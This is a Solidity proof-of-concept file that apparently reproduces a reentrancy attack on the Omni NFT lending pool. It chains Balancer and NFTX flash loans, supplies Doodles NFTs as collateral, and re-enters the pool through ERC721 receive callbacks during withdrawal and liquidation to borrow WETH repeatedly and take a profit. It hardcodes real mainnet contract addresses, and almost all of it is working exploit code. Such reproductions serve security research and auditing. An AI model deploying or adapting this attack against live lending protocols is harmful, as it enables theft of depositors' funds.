// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/interfaces/IERC20.sol";
import "@openzeppelin/interfaces/IERC721.sol";
import "forge-std/console.sol";

interface IWETH {
    function withdraw(uint256 wad) external;
}

interface INFTXVault{
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes memory data
    ) external returns (bool);
    function redeem(uint256 amount, uint256[] calldata specificIds) external returns (uint256[] calldata);
    function balanceOf(address account) external view returns (uint256);
    function mint(
        uint256[] calldata tokenIds,
        uint256[] calldata amounts /* ignored for ERC721 vaults */
    ) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ISushiSwap{
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface DataTypes {
    struct ERC721SupplyParams {
        uint256 tokenId;
        bool useAsCollateral;
    }
}

interface IOmni{
    function supplyERC721(
        address asset,
        DataTypes.ERC721SupplyParams[] memory tokenData,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function withdrawERC721(
        address asset,
        uint256[] memory tokenIds,
        address to
    ) external returns (uint256);
    
    function liquidationERC721(
        address collateralAsset,
        address liquidationAsset,
        address user,
        uint256 collateralTokenId,
        uint256 liquidationAmount,
        bool receiveNToken
    ) external;

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralBase,
        uint256 totalDebtBase,
        uint256 availableBorrowsBase,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor,
        uint256 erc721HealthFactor
    );
}

contract DebtTaker {
    address immutable liquidator;
    IERC20 immutable WETH;
    IERC20 immutable doodleVault;
    address immutable doodles;
    IOmni immutable pool;

    uint256[] tokenIds;

    constructor(
        uint[] memory _tokenIds,
        address _weth,
        address _doodleVault,
        address _doodles,
        address _pool
    ) {
        liquidator = msg.sender;
        tokenIds = _tokenIds;
        WETH = IERC20(_weth);
        doodleVault = IERC20(_doodleVault);
        doodles = _doodles;
        pool = IOmni(_pool);
    }

    function prepareLiquidationScene() external {
        IERC721(doodles).setApprovalForAll(address(pool), true);
        WETH.approve(address(pool), type(uint256).max);

        DataTypes.ERC721SupplyParams[] memory params = new DataTypes.ERC721SupplyParams[](3);

        params[0].tokenId = tokenIds[1];
        params[0].useAsCollateral = true;

        params[1].tokenId = tokenIds[2];
        params[1].useAsCollateral = true;

        params[2].tokenId = tokenIds[3];
        params[2].useAsCollateral = true;

        supplyCollateralAndBorrow(params);

        console.log(
            ">>>> Inside DoodleVault callback: Taker supplied 3 doodles as collateral, borrows %s weth from omni pool",
            WETH.balanceOf(address(this))
        );

        uint256[] memory withdrawTokenIds = new uint256[](2);

        withdrawTokenIds[0] = tokenIds[1];
        withdrawTokenIds[1] = tokenIds[2];

        require(pool.withdrawERC721(doodles, withdrawTokenIds, address(liquidator)) == 2, "Withdraw Error.");
    }

    function supplyCollateralAndBorrow(DataTypes.ERC721SupplyParams[] memory _params) internal {
        pool.supplyERC721(doodles, _params, address(this), 0);
        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));
        pool.borrow(address(WETH), amount, 2, 0, address(this));
    }

    function borrowALot() external {
        IERC721(doodles).setApprovalForAll(address(pool), true);

        DataTypes.ERC721SupplyParams[] memory params = new DataTypes.ERC721SupplyParams[](tokenIds.length);
        for (uint i; i < params.length; i++) {
            params[i].tokenId = tokenIds[i];
            params[i].useAsCollateral = true; 
        }

        supplyCollateralAndBorrow(params);

        console.log(
            ">>>>>>>> Inside Omni liquidate safeTransferFrom callback: Taker supplied 4 doodles as collateral, borrowed all possible weth, balance is %s weth",
            WETH.balanceOf(address(this))
        );
    }

    function withdrawAll() external {
        pool.withdrawERC721(doodles, tokenIds, address(liquidator));
        WETH.transfer(address(liquidator), WETH.balanceOf(address(this)));
    } 

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract Liquidator {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address doodleVault = 0x2F131C4DAd4Be81683ABb966b4DE05a549144443;
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address doodles = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
    ISushiSwap router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
    DebtTaker private debtTaker;

    uint256[] tokenIds = [7165, 720, 5251, 7425];

    enum ReceiveState {
        NONE,
        FIRST_WITHDRAW,
        LIQUIDATE,
        BORROW_ALOT
    }
    ReceiveState receiveState = ReceiveState.NONE;

    function startExploit() public {
        console.log(">>> Start exploit <<<");
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;

        balancer.flashLoan(address(this), tokens, amounts, "");
        console.log(">>> Finished exploit. Profit: %s weth <<<", WETH.balanceOf(address(this)));
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        console.log(">> Inside Balancer callback: Flashloaned %s weth from balancer", WETH.balanceOf(address(this)));
        require(msg.sender == address(balancer));

        IERC20(doodleVault).approve(doodleVault, type(uint256).max);
        IERC721(doodles).setApprovalForAll(doodleVault, true);
        INFTXVault(doodleVault).flashLoan(address(this), doodleVault, 4 ether, "");

        WETH.transfer(address(balancer), 1000 ether);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        console.log(">>>> Inside DoodleVault callback: Flashloaned %s dv erc20s from DoodleVault", IERC20(doodleVault).balanceOf(address(this)));
        require(msg.sender == doodleVault);

        swapMoreDoodleERC20s();
        
        INFTXVault(doodleVault).redeem(4, tokenIds);
        require(IERC721(doodles).balanceOf(address(this)) >= 4, "redeem error.");

        useDebtTaker();

        uint256[] memory _amount = new uint256[](4);
        for (uint256 j = 0; j < _amount.length; j++) {
            _amount[j] = 0;
        }
        require(INFTXVault(doodleVault).mint(tokenIds, _amount) == 4, "Error Amounts.");
   
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function swapMoreDoodleERC20s() internal {
        WETH.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = doodleVault;

        router.swapTokensForExactTokens(3e17, 200 ether, path, address(this), block.timestamp);
        console.log(
            ">>>> Inside DoodleVault callback: swapped weth for dv, current balances: %s WETH and %s dv", 
            WETH.balanceOf(address(this)),
            IERC20(doodleVault).balanceOf(address(this))
        );
    }

    function useDebtTaker() internal {
        debtTaker = new DebtTaker(
            tokenIds,
            address(WETH),
            doodleVault,
            doodles,
            address(pool)
        );

        for (uint256 i = 0; i < tokenIds.length; i++) {
            IERC721(doodles).transferFrom(address(this), address(debtTaker), tokenIds[i]);
        }

        receiveState = ReceiveState.FIRST_WITHDRAW;
        debtTaker.prepareLiquidationScene();

        debtTaker.withdrawAll();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (msg.sender == doodles) {
            if (receiveState == ReceiveState.FIRST_WITHDRAW) {
                receiveState = ReceiveState.LIQUIDATE;
            }
            else if (receiveState == ReceiveState.LIQUIDATE) {
                receiveState = ReceiveState.BORROW_ALOT;

                WETH.approve(address(pool), type(uint256).max);
                pool.liquidationERC721(doodles, address(WETH), address(debtTaker), tokenIds[3], 100 ether, false);
            } else if (receiveState == ReceiveState.BORROW_ALOT) {
                receiveState = ReceiveState.NONE;
                console.log(
                    ">>>>>>>> Inside Omni liquidate safeTransferFrom callback: liquidated 1 erc712, doodle balance is %s, weth balance is %s",
                    IERC721(doodles).balanceOf(address(this)),
                    WETH.balanceOf(address(this))
                );

                uint256[] memory specificIds = new uint256[](3);
                specificIds[0] = tokenIds[1];
                specificIds[1] = tokenIds[2];
                specificIds[2] = tokenIds[3];
                for (uint256 i = 0; i < specificIds.length; i++) {
                    IERC721(doodles).safeTransferFrom(address(this), address(debtTaker), specificIds[i]);
                }

                debtTaker.borrowALot();
            }
        }
        return this.onERC721Received.selector;
    }
}